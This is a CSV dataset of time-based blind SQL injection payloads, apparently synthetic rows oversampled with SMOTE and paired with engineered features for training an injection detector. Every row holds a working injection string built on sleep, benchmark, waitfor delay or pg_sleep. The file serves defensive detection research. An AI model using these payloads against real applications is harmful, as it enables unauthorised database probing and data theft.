id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000279,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000090,1.4486651408584201,94.64576631253689,28.0,3.8237960411397958,20.0,29.645766312536885,34.0,11.0,0.21131967231234738,0.31321106498487095,0.3592434429309906,0.11622581977179107,0.6457663125368861,0.3542336874631139,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.6457663125368861,0.3542336874631139,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.6457663125368861,0.3542336874631138,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000280,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000088,0.04047912590985282,69.93292607214899,24.03832795877201,3.6089389597924026,22.009581989693,10.0,26.942508061841988,10.980836020613996,0.314772418524089,0.14300923793163495,0.3852123719684618,0.15700597157581425,3.990418010306998,0.0,0.0,0.0,0.0,1.0,0.0,3.990418010306998,0.0,0.0,0.0,2.990418010306998,1.0,0.0,0.0,0.009581989693001919,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.009581989693001836,0.990418010306998,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000281,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,0.6564358565525727,67.34025867384636,20.620036953406622,3.0471007779629575,21.189981523296687,1.8100184767033127,33.910203243736426,10.430055430109935,0.3176411414489782,0.026535912250392618,0.5013941109191532,0.15442883538147587,3.8100184767033114,0.0,0.0,0.0,0.0,1.0,0.0,5.620036953406623,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.18998152329668871,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1899815232966886
SMOTE_000282,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",nearest_attack_euclidean,R000093,1.5666716851926823,81.68280201000437,17.56658492461606,2.682914139118038,17.58353768845986,4.266339698464227,45.69975477384817,14.133169849232115,0.21816606107492054,0.04950815616514524,0.5599517587940216,0.17237402396591267,0.0,4.0,0.0,0.0,0.0,1.2832924623080284,0.0,8.0,0.5665849246160566,0.0,0.28329246230802846,1.2832924623080284,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000283,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,0.5908812327203211,56.23455097477351,22.074086768919866,3.688032513969423,23.0,3.691362256306622,18.54318871846689,11.0,0.40943153392302284,0.06597433596233286,0.3287790486731985,0.19581508144144572,5.691362256306622,0.0,0.0,0.0,0.0,1.0,0.0,2.308637743693378,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000284,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000066,3.5610806766655605,76.67162227726557,29.0,4.077799772476419,30.36998598229439,10.876671339235203,22.42496495573598,13.0,0.3973770540722388,0.14577555099150383,0.2846069474504201,0.17224044748583736,4.438335669617602,0.0,0.8766713392352029,0.0,0.0,1.0,0.0,2.6849929911471957,0.0,0.0,0.0,5.0,1.0,0.0,0.43833566961760145,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.5616643303823986,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5616643303823987,0.0,0.4383356696176014,0.4383356696176014,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000285,attack,time,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000060,1.2496620569927845,66.67192297891341,19.52456042555906,2.8625411159872254,10.0,10.0,35.6228021277953,11.04912085111812,0.15134713525787394,0.1513471352578739,0.5326691519762655,0.16463657750798658,0.23771978722046994,0.76228021277953,0.0,0.0,0.0,1.0,0.0,6.52456042555906,0.7622802127795301,0.0,1.0,1.0,0.23771978722047016,0.7622802127795301,0.0,0.76228021277953,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000286,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000075,2.215678395741429,85.14260783020073,27.840306803553027,3.6417567438486507,27.04184082131816,10.0,35.52092041065908,12.579846598223487,0.31391716758412963,0.11856598133576149,0.4178037427307401,0.14971310834936874,4.0,0.0,0.0,0.0,0.0,1.5798465982234866,0.0,4.840306803553027,1.159693196446973,1.0,0.0,1.5798465982234864,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000287,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000108,2.4087757167564234,94.0,23.0,3.1645748424006084,29.402844081642087,5.726697142835134,45.5323853061193,13.338073469403476,0.3127962136344902,0.06092231003016099,0.4843870777246735,0.14189439861067527,0.0,1.8704587755227808,0.0,0.0,1.0,1.0,0.0,8.532385306119306,0.9352293877613904,0.0,0.0,2.0,0.0,0.4676146938806952,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.4676146938806953,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.467614693880695
SMOTE_000288,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.42402750112832716,96.87451692525246,28.0,3.772010377548883,26.0,22.0,36.29961354020197,12.574903385050492,0.2688982589880191,0.22752929606678535,0.37389968191129286,0.1296727630339027,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.574903385050493,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000289,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000050,1.0433518120199372,72.0,23.950598356225225,3.530266983181584,16.366267762516518,19.633732237483482,28.0,8.0,0.22730927447939608,0.2726907255206039,0.3888888888888889,0.1111111111111111,0.3168661187417414,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,0.31686611874174164,0.0,0.0,0.6831338812582585,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000290,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000035,0.37614073633573575,83.99695856670299,24.8006082866594,3.204043044330099,30.0,2.0,39.996958566702986,12.0,0.357571089907878,0.023838072660525192,0.4755624014684456,0.1430284359631512,0.0,0.900304143329701,0.0,0.0,1.0,0.0,0.0,8.199391713340598,0.900304143329701,0.0,0.0,1.0,0.0,0.9003041433297012,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000291,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000106,1.8319909798324152,96.32221757500477,23.0,3.2043967764122816,30.322217575004778,9.580554393751195,45.4194456062488,11.0,0.3145100260475809,0.09939992996499883,0.4718417149953504,0.11424832899206985,0.0,0.0,0.0,0.0,1.0,1.0,0.0,8.419445606248805,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.5805543937511947,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.5805543937511946,1.0,0.41944560624880534,0.5805543937511946,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.5805543937511946
SMOTE_000292,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000090,0.48698434244203487,94.04600240313566,27.86371462901938,3.843087243633666,20.0,29.863714629019377,33.45485851607752,10.727429258038761,0.212808606691063,0.31766421263908745,0.35557984178477897,0.11394733888507058,0.8637146290193805,0.0,2.0,0.0,0.0,2.0,0.0,4.8637146290193805,0.0,0.0,1.0,4.0,0.8637146290193805,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.8637146290193806,0.13628537098061938,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000293,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000108,1.416796159313955,92.42984437321647,22.476614791072155,3.0831747577667143,29.42984437321647,1.4766147910721568,46.04677041785568,15.476614791072157,0.31822307639848463,0.01589222604797169,0.4984864884830131,0.16739820907053066,0.0,3.4766147910721568,0.0,0.0,1.0,1.0,0.0,8.523385208927843,1.4766147910721565,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.4766147910721568,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.476614791072157
SMOTE_000294,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.9684186820884702,71.23527294706088,24.722701173108067,3.503431190651527,21.722701173108067,10.0,30.873922360506846,8.638649413445966,0.30672294110641807,0.14066500200789306,0.4316767735235065,0.12093528336218241,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.638649413445966,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000295,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,0.34121603558570457,63.20845099757473,27.68732350363791,4.296059564898785,26.583098004850545,12.0,14.729578491511546,9.895774501212637,0.420783149541164,0.18986534506205208,0.23273385372385377,0.15661765167293012,2.895774501212637,0.0,2.0,0.0,0.0,1.0,0.0,1.1042254987873639,0.0,0.0,0.0,3.8957745012126366,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8957745012126364,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8957745012126366
SMOTE_000296,attack,time,"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000125,2.0629207123399036,79.82011622105236,18.585930230409346,2.7435540167061747,13.585930230409346,6.687441843274774,44.20302322573085,15.343720921637388,0.17425103431877018,0.07732761770732843,0.5548539324328451,0.19356741554105633,0.0,4.0,0.0,0.0,0.0,1.5859302304093468,0.0,7.171860460818694,2.0,0.0,0.5859302304093468,1.5859302304093468,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5859302304093468,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.585930230409347
SMOTE_000297,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000045,0.2605246762971281,75.74411871374272,22.0,3.3233311516721398,15.0,18.0,32.99529497099418,9.748823742748545,0.19820314200827185,0.23784377040992621,0.4353062187047798,0.12864686887702212,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.748823742748545,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000298,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.7833089175191006,66.57209057372734,24.057672458981866,3.551611583897181,21.057672458981866,10.0,27.514418114745467,8.0,0.31562982710009513,0.15042551953413194,0.4136042377384674,0.12034041562730556,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000299,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000104,1.1352868760144545,86.18547920808902,23.619501890173726,3.0793760237792647,30.0,2.0,42.80498109826275,11.380498109826275,0.3493883587407985,0.023292557249386545,0.4951186416131751,0.13220044239663983,0.6195018901737248,0.0,0.0,0.0,1.0,0.0,0.0,8.76099621965255,0.0,0.0,0.0,1.0,0.6195018901737248,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000300,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000049,1.6970112928807557,57.52368903716969,18.50789634572323,3.1888484109866995,23.015792691446457,1.0,25.0,8.507896345723228,0.3999283389537738,0.017395977894319084,0.4348994473579776,0.14777623579392957,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.5078963457232276,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.49210365427677244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4921036542767725
SMOTE_000301,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000127,0.6287694893099074,57.560370745881414,18.346749054640313,2.9463878042856413,10.0,10.0,29.04024716392094,8.52012358196047,0.17428469575307304,0.17428469575307304,0.5040009506304651,0.14742965786338874,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.173374527320156,0.17337452732015676,0.0,1.0,1.0,1.0,0.0,0.0,0.1733745273201568,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000302,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,0.028591242102929314,55.059736786097915,22.955197410426567,3.7896247683267545,23.0,3.985065803475522,17.074670982622393,11.0,0.41775841415092385,0.07240051526864778,0.3100435681604212,0.1997975024200071,5.985065803475521,0.0,0.0,0.0,0.0,1.0,0.0,2.014934196524478,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000303,attack,time," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",nearest_attack_euclidean,R000069,0.396602454557525,57.56547990831679,18.113095981663356,3.0895699162038324,22.452383926653425,1.0,26.113095981663356,8.0,0.389741178787854,0.017383848356446865,0.4538041860041242,0.1390707868515749,0.0,3.0,0.0,0.0,0.0,0.8869040183366433,0.0,4.113095981663356,0.0,0.0,0.0,0.8869040183366435,0.0,1.0,0.0,0.0,0.0,0.8869040183366433,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000304,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000066,3.8603360261031696,90.15577922495291,29.0,3.7927591391187643,29.562813850031397,13.437186149968603,33.29648268746075,13.85929653749215,0.3321647620168857,0.14682874839269888,0.36733577088059793,0.1536707187098175,4.0,0.0,0.0,0.0,0.0,1.4296482687460754,0.0,4.859296537492151,0.0,0.0,0.4296482687460754,4.570351731253925,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5703517312539246,1.0,0.0,1.0,0.5703517312539246,0.0,0.4296482687460754,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000305,attack,time,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000087,0.6806284109104082,69.02604730117707,26.0,3.7319317019504568,15.794790539764588,21.205209460235416,24.820837840941653,7.205209460235413,0.2291758662137709,0.30729396655344277,0.3592247860507218,0.10430538118206459,0.2052094602354131,0.0,0.0,0.0,0.0,1.0,0.0,4.205209460235413,0.0,0.0,1.0,1.0,0.2052094602354133,0.0,0.0,0.7947905397645867,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000306,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,2.681324880821267,59.42280384806,25.211401924030003,4.017023712868987,24.769121539224003,7.538243078448003,15.673158845581998,11.442280384806,0.41694467025229087,0.12221318990836369,0.2676464534517454,0.1931956863876,5.557719615193999,0.0,0.8845607696120008,0.0,0.0,1.0,0.0,1.5577196151939998,0.0,0.0,0.0,2.326841154418001,1.0,0.0,0.4422803848060004,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.44228038480600046,0.0,0.4422803848060004,0.0,0.5577196151939996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4422803848060006
SMOTE_000307,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000149,0.25581729836432787,92.771578253294,26.114210873353,3.7160698671337387,21.885789126647,27.114210873353002,33.771578253294,10.0,0.23588300920692318,0.2923509723792305,0.363963165028917,0.10780285338492931,1.0,0.0,0.11421087335299912,0.0,0.0,2.0,0.0,4.942894563323501,0.0,0.0,1.0,2.1142108733529987,1.0,0.0,0.05710543667649956,0.9428945633235006,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000308,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000055,1.4439123619587166,66.96520050094905,24.47390037571179,3.577694916524016,20.96520050094905,10.0,27.491300125237263,8.508699874762737,0.3124635948815287,0.14946443589531985,0.41067426858746886,0.12739770063568262,0.0,0.5086998747627375,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.5086998747627376,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000309,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000128,0.35548934240642116,79.14786406868011,26.142022655219982,3.510837800429794,16.0,21.0,33.147864068680114,9.0,0.20230307008464837,0.2655227794861009,0.418378673506636,0.1137954769226147,0.14202265521998125,0.0,0.0,0.0,0.0,1.0,0.0,5.857977344780019,0.0,0.0,1.0,1.0,0.14202265521998153,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000310,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000104,0.7804191269971325,86.17367501783548,24.0,3.110391766999513,30.0,2.0,42.43714413233509,11.736530885500379,0.3504298779828696,0.023361991865524637,0.4902774689770749,0.13593066117453076,1.0,0.0,0.0,0.0,1.0,0.0,0.0,8.736530885500379,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
